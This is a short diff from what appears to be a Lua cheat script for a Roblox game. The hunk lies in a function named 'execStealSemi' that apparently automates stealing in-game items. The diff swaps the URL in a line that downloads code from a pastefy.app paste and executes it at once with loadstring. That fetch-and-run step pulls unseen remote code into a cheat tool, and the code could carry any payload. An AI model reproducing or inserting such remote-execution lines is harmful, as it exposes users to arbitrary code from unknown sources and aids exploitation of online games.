@@ -2162,7 +2162,7 @@ local function execStealSemi(prompt, animalData)
             end
             task.wait()
         end
-loadstring(game:HttpGet("https://pastefy.app/VTTP7iv6/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/7i3erNhz/raw"))()
         SemiSteal.StealState.active = false
         SemiSteal.StealState.phase = "idle"
 
